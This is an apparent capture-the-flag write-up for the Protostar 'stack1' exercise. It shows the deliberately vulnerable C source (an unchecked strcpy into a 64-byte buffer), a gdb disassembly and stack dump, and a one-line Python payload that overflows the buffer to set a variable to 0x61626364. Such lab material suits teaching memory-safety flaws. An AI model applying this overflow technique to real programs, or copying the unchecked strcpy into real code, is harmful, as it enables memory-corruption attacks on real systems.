```
TL;DR -> `./stack1 $(python -c "print 'A'*64 + '\x64\x63\x62\x61'")`
```

# Stack1

URL: https://exploit.education/protostar/stack-one/
This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

This level is at /opt/protostar/bin/stack1

Hints

- If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
  Protostar is little endian

Source code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

# Writeup

In stack1 we have to pass the argument while running th binary and it will check for the address. In short, we have to overflow the buffer and add the last address that is been compared.

```
user@protostar:/opt/protostar/bin$ gdb ./stack1
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack1...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x08048464 <main+0>:    push   ebp
0x08048465 <main+1>:    mov    ebp,esp
0x08048467 <main+3>:    and    esp,0xfffffff0
0x0804846a <main+6>:    sub    esp,0x60
0x0804846d <main+9>:    cmp    DWORD PTR [ebp+0x8],0x1
0x08048471 <main+13>:   jne    0x8048487 <main+35>
0x08048473 <main+15>:   mov    DWORD PTR [esp+0x4],0x80485a0
0x0804847b <main+23>:   mov    DWORD PTR [esp],0x1
0x08048482 <main+30>:   call   0x8048388 <errx@plt>
0x08048487 <main+35>:   mov    DWORD PTR [esp+0x5c],0x0
0x0804848f <main+43>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <main+46>:   add    eax,0x4
0x08048495 <main+49>:   mov    eax,DWORD PTR [eax]
0x08048497 <main+51>:   mov    DWORD PTR [esp+0x4],eax
0x0804849b <main+55>:   lea    eax,[esp+0x1c]
0x0804849f <main+59>:   mov    DWORD PTR [esp],eax
0x080484a2 <main+62>:   call   0x8048368 <strcpy@plt>
0x080484a7 <main+67>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <main+71>:   cmp    eax,0x61626364
0x080484b0 <main+76>:   jne    0x80484c0 <main+92>
0x080484b2 <main+78>:   mov    DWORD PTR [esp],0x80485bc
0x080484b9 <main+85>:   call   0x8048398 <puts@plt>
0x080484be <main+90>:   jmp    0x80484d5 <main+113>
0x080484c0 <main+92>:   mov    edx,DWORD PTR [esp+0x5c]
0x080484c4 <main+96>:   mov    eax,0x80485f3
0x080484c9 <main+101>:  mov    DWORD PTR [esp+0x4],edx
0x080484cd <main+105>:  mov    DWORD PTR [esp],eax
0x080484d0 <main+108>:  call   0x8048378 <printf@plt>
0x080484d5 <main+113>:  leave
0x080484d6 <main+114>:  ret
End of assembler dump.
(gdb) r $(python -c "print 'A'*64")
Starting program: /opt/protostar/bin/stack1 $(python -c "print 'A'*64")
Try again, you got 0x00000000

Program exited with code 036.
(gdb)
(gdb)
(gdb)
(gdb)
(gdb)
(gdb) break *0x080484ab
Breakpoint 1 at 0x80484ab: file stack1/stack1.c, line 18.
(gdb) r $(python -c "print 'A'*64")
Starting program: /opt/protostar/bin/stack1 $(python -c "print 'A'*64")

Breakpoint 1, 0x080484ab in main (argc=2, argv=0xbffff814) at stack1/stack1.c:18
18      stack1/stack1.c: No such file or directory.
        in stack1/stack1.c
(gdb) x/24x $esp
0xbffff700:     0xbffff71c      0xbffff951      0xb7fff8f8      0xb7f0186e
0xbffff710:     0xb7fd7ff4      0xb7ec6165      0xbffff728      0x41414141
0xbffff720:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff730:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff740:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff750:     0x41414141      0x41414141      0x41414141      0x00000000
```

Here, we have set the break point before compare execution and checked the stack using `x/24x $esp` and from that we can see that, we have reached the last byte of buffer, now we just have to append the address in the stack. Therefore adding `\x64\x63\x62\x61` will add the address in the last byte and that will be compared with the modified value.

Payload: `python -c "print 'A'*64 + '\x64\x63\x62\x61'"`

---

One liner solution:
`./stack1 $(python -c "print 'A'*64 + '\x64\x63\x62\x61'")`
